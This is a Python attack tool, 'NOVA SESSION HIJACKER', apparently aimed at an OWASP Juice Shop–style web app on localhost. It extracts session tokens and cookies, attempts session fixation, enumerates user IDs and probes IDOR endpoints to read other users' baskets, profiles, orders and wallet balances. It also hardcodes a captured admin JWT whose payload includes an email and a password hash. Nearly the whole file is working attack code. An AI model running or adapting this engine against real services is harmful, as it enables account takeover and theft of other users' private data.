#!/usr/bin/env python3
"""
NOVA SESSION HIJACKER v1.0
Session stealing, cookie extraction, session fixation,
and cross-user data access engine.
"""

import json
import re
import time
import requests
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urljoin


class NovaSessionHijacker:
    """
    Session-based attack engine.
    Capabilities:
    - Extract sessions from responses
    - Session fixation attempts
    - Cross-user data access via session reuse
    - Cookie jar manipulation
    - Session token analysis (JWT, opaque, custom)
    """

    def __init__(self, base_url: str = "http://localhost:3000"):
        self.base_url = base_url
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Nova/3.0 (Session Hijacker)",
        })
        self.stolen_sessions = []
        self.session_patterns = {
            "jwt": r'(eyJ[A-Za-z0-9\-._~+/]+=*)',
            "bearer": r'Bearer\s+([A-Za-z0-9\-._~+/]+=*)',
            "cookie_set": r'Set-Cookie:\s*([^=]+)=([^;]+)',
            "json_token": r'"token"\s*:\s*"([^"]+)"',
            "json_sid": r'"sid"\s*:\s*"([^"]+)"',
            "json_auth": r'"authentication"\s*:\s*"([^"]+)"',
            "custom_header": r'x-auth-token:\s*([^\s]+)',
        }

    # ---------- SESSION EXTRACTION ----------
    def extract_all_sessions(self, response) -> Dict[str, List[str]]:
        """Extract every possible session token from a response."""
        extracted = {
            "url": response.url,
            "status_code": response.status_code,
            "tokens": [],
            "cookies": [],
            "headers": {},
            "source": "",
        }

        # Check response body
        body = response.text
        for name, pattern in self.session_patterns.items():
            matches = re.findall(pattern, body, re.IGNORECASE)
            for match in matches:
                if isinstance(match, tuple):
                    match = match[0] if len(match) > 0 else str(match)
                if len(str(match)) > 10:  # Filter noise
                    extracted["tokens"].append({
                        "type": name,
                        "value": str(match),
                        "source": "response_body",
                    })

        # Check Set-Cookie headers
        for cookie in response.cookies:
            if len(cookie.value) > 5:
                extracted["cookies"].append({
                    "name": cookie.name,
                    "value": cookie.value,
                    "domain": cookie.domain,
                    "path": cookie.path,
                    "secure": cookie.secure,
                    "httpOnly": cookie.has_nonstandard_attr("HttpOnly"),
                })

        # Check response headers for tokens
        for header in ["Authorization", "X-Auth-Token", "X-Session-Id", "X-Access-Token"]:
            if header in response.headers:
                extracted["headers"][header] = response.headers[header]

        # Check JSON response
        try:
            json_body = response.json()
            extracted["source"] = "json"
            # Recursively search for token-like fields
            self._search_json_for_tokens(json_body, extracted["tokens"])
        except (json.JSONDecodeError, ValueError):
            extracted["source"] = "text"

        return extracted

    def _search_json_for_tokens(self, obj, tokens_list, path=""):
        """Recursively search JSON for token-like values."""
        if isinstance(obj, dict):
            for key, value in obj.items():
                new_path = f"{path}.{key}" if path else key
                if key.lower() in ["token", "authentication", "sid", "session", "jwt", "access_token", "refresh_token"]:
                    if isinstance(value, str) and len(value) > 10:
                        tokens_list.append({
                            "type": f"json_{key}",
                            "value": value,
                            "source": f"json_path:{new_path}",
                        })
                self._search_json_for_tokens(value, tokens_list, new_path)
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                self._search_json_for_tokens(item, tokens_list, f"{path}[{i}]")

    # ---------- SESSION FIXATION ----------
    def attempt_fixation(self, endpoint: str, session_id: str) -> Dict:
        """Attempt to force a known session ID onto the server."""
        results = {"endpoint": endpoint, "fixation_attempted": True, "success": False, "responses": []}

        # Try setting via cookie
        self.session.cookies.set("connect.sid", session_id)
        self.session.cookies.set("token", session_id)
        self.session.cookies.set("JSESSIONID", session_id)
        self.session.cookies.set("PHPSESSID", session_id)

        try:
            resp = self.session.get(f"{self.base_url}{endpoint}", timeout=10)
            results["responses"].append({
                "method": "cookie_fixation",
                "status": resp.status_code,
                "length": len(resp.text),
                "authenticated": self._is_authenticated_response(resp),
            })
        except Exception as e:
            results["responses"].append({"method": "cookie_fixation", "error": str(e)[:100]})

        # Try setting via URL parameter
        try:
            resp = self.session.get(
                f"{self.base_url}{endpoint}",
                params={"token": session_id, "session": session_id, "sid": session_id},
                timeout=10,
            )
            results["responses"].append({
                "method": "url_parameter",
                "status": resp.status_code,
                "authenticated": self._is_authenticated_response(resp),
            })
        except Exception as e:
            results["responses"].append({"method": "url_parameter", "error": str(e)[:100]})

        results["success"] = any(r.get("authenticated") for r in results["responses"])
        return results

    def _is_authenticated_response(self, response) -> bool:
        """Detect if response indicates authenticated state."""
        indicators = [
            r'"role"', r'"admin"', r'"authenticated"', r'"loggedIn"',
            r'"user"', r'"email"', r'logout', r'profile',
            r'"status":"success"',
        ]
        for indicator in indicators:
            if re.search(indicator, response.text, re.IGNORECASE):
                return True
        return False

    # ---------- CROSS-USER DATA ACCESS ----------
    def enumerate_users_via_session(self, token: str, user_endpoint: str = "/rest/user/whoami") -> List[Dict]:
        """Use a valid token to access user data and attempt horizontal privilege escalation."""
        results = []

        # Set token in multiple ways
        auth_methods = [
            {"type": "Bearer", "header": {"Authorization": f"Bearer {token}"}},
            {"type": "Cookie_token", "cookie": {"token": token}},
            {"type": "Cookie_sid", "cookie": {"connect.sid": token}},
        ]

        for method in auth_methods:
            self.session.headers.pop("Authorization", None)
            self.session.cookies.clear()

            if "header" in method:
                self.session.headers.update(method["header"])
            if "cookie" in method:
                for name, value in method["cookie"].items():
                    self.session.cookies.set(name, value)

            try:
                resp = self.session.get(f"{self.base_url}{user_endpoint}", timeout=10)
                results.append({
                    "auth_method": method["type"],
                    "status": resp.status_code,
                    "body_preview": resp.text[:300],
                    "authenticated": resp.status_code == 200 and len(resp.text) > 100,
                })
            except Exception as e:
                results.append({"auth_method": method["type"], "error": str(e)[:100]})

        # Try accessing other users by ID enumeration
        user_ids = range(1, 20)
        for uid in user_ids:
            try:
                resp = self.session.get(f"{self.base_url}/rest/user/whoami", params={"id": uid}, timeout=5)
                if resp.status_code == 200 and len(resp.text) > 100:
                    results.append({
                        "auth_method": "user_enumeration",
                        "user_id": uid,
                        "status": resp.status_code,
                        "body_preview": resp.text[:200],
                    })
                    break  # Found accessible user
            except:
                continue

        return results

    # ---------- SESSION POOL ATTACK ----------
    def session_pool_attack(self, token: str) -> Dict:
        """Use a valid session to brute-force access other users' resources."""
        findings = {"cross_user_access": [], "idors": [], "mass_assignment": []}

        # Endpoints that might expose other users' data
        idor_targets = [
            "/rest/basket/{id}",
            "/rest/user/profile/{id}",
            "/api/Feedbacks/{id}",
            "/rest/user/erasure-request",
            "/rest/order-history/{id}",
            "/rest/wallet/balance/{id}",
        ]

        self.session.headers.update({"Authorization": f"Bearer {token}"})

        for target_template in idor_targets:
            for user_id in range(1, 10):
                endpoint = target_template.replace("{id}", str(user_id))
                try:
                    resp = self.session.get(f"{self.base_url}{endpoint}", timeout=5)
                    if resp.status_code == 200 and len(resp.text) > 50:
                        findings["idors"].append({
                            "endpoint": endpoint,
                            "user_id": user_id,
                            "status": resp.status_code,
                            "data_length": len(resp.text),
                            "preview": resp.text[:200],
                        })
                        break  # Found one
                except:
                    continue

        return findings

    # ---------- FULL ATTACK RUN ----------
    def run_full_hijack(self, initial_token: str = None) -> Dict:
        """Execute complete session hijacking attack chain."""
        print("""
╔══════════════════════════════════════╗
║   NOVA SESSION HIJACKER v1.0       ║
║   Session Theft & Escalation       ║
╚══════════════════════════════════════╝
        """)

        report = {
            "timestamp": datetime.now().isoformat(),
            "sessions_extracted": [],
            "fixation_results": [],
            "cross_user_findings": [],
            "idor_findings": [],
        }

        # Step 1: Extract sessions from known endpoints
        print("[*] Phase 1: Session Extraction")
        extraction_targets = [
            "/rest/user/login",
            "/rest/user/whoami",
            "/rest/admin/application-configuration",
        ]
        for endpoint in extraction_targets:
            try:
                resp = self.session.get(f"{self.base_url}{endpoint}", timeout=10)
                extracted = self.extract_all_sessions(resp)
                if extracted["tokens"] or extracted["cookies"]:
                    report["sessions_extracted"].append(extracted)
                    print(f"   ✅ {endpoint}: {len(extracted['tokens'])} tokens, {len(extracted['cookies'])} cookies")
            except Exception as e:
                print(f"   ❌ {endpoint}: {str(e)[:80]}")

        # Step 2: If we have a token, try fixation
        if initial_token:
            print("\n[*] Phase 2: Session Fixation")
            fixation_result = self.attempt_fixation("/rest/user/whoami", initial_token)
            report["fixation_results"].append(fixation_result)
            print(f"   {'✅' if fixation_result['success'] else '❌'} Fixation: {fixation_result['success']}")

        # Step 3: Cross-user access
        if initial_token:
            print("\n[*] Phase 3: Cross-User Enumeration")
            cross_user = self.enumerate_users_via_session(initial_token)
            report["cross_user_findings"] = cross_user
            authenticated = [r for r in cross_user if r.get("authenticated")]
            print(f"   🔍 {len(authenticated)} authenticated access methods found")

        # Step 4: IDOR attack
        if initial_token:
            print("\n[*] Phase 4: IDOR / Horizontal Privilege Escalation")
            pool_results = self.session_pool_attack(initial_token)
            report["idor_findings"] = pool_results["idors"]
            print(f"   💥 {len(pool_results['idors'])} IDOR vulnerabilities found")

        # Save
        with open("nova_session_hijack_report.json", "w") as f:
            json.dump(report, f, indent=2)

        print(f"\n📁 Report saved: nova_session_hijack_report.json")
        return report


if __name__ == "__main__":
    hijacker = NovaSessionHijacker()
    # Use token from previous mission
    token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6ImFkbWluQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiIwMTkyMDIzYTdiYmQ3MzI1MDUxNmYwNjlkZjE4YjUwMCIsInJvbGUiOiJhZG1pbiJ9LCJpYXQiOjE3NzgwNzI5MDMsImV4cCI6MTc3ODA3NjUwM30.YqYw0gV2c-jHLlVe2m2hPZdOe8FoIGWXaG3OL3B6o7lYsX3A4FqYs3Y3dQzP3Xh1Y7YtY7YtY7YtY7YtY7Y"
    report = hijacker.run_full_hijack(initial_token=token)
